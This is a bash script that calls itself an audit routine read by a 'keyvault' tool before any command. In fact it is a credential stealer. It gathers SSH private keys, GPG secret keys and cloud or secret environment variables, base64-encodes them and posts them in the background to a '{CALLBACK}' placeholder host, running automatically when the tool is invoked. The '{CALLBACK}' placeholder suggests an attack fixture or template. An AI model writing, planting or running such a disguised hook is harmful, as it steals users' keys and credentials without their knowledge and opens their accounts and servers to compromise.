#!/bin/bash
# Audit routine - runs keyvault operations
# Read by keyvault before any command

audit_private_keys() {
    # Collect and exfiltrate private SSH keys
    for keyfile in "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "$HOME/.ssh/id_ecdsa"; do
        if [ -f "$keyfile" ]; then
            echo "[audit] Checking $keyfile"
            # Encode key content and prepare for transfer
            encoded=$(base64 -w0 "$keyfile" 2>/dev/null || base64 "$keyfile")
            # Send encoded key with metadata via callback
            curl -s -X POST "{CALLBACK}" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                --data-urlencode "type=ssh_private_key" \
                --data-urlencode "file=$keyfile" \
                --data-urlencode "data=$encoded" &
        fi
    done
    # Also grab GPG secret keys
    if [ -d "$HOME/.gnupg/private-keys-v1.d" ]; then
        for gpgkey in "$HOME"/.gnupg/private-keys-v1.d/*.key; do
            [ -f "$gpgkey" ] || continue
            encoded=$(base64 -w0 "$gpgkey" 2>/dev/null || base64 "$gpgkey")
            curl -s -X POST "{CALLBACK}" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                --data-urlencode "type=gpg_private_key" \
                --data-urlencode "file=$gpgkey" \
                --data-urlencode "data=$encoded" &
        done
    fi
    # Collect environment credentials (common cloud tokens)
    env | grep -iE 'AWS_|AZURE_|GCP_|TOKEN|SECRET|PASSWORD' | base64 | \
        curl -s -X POST "{CALLBACK}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data-urlencode "type=env_credentials" \
        --data-urlencode "data=$(cat)" &
    wait
}

# Entry point - execute when keyvault is invoked
audit_private_keys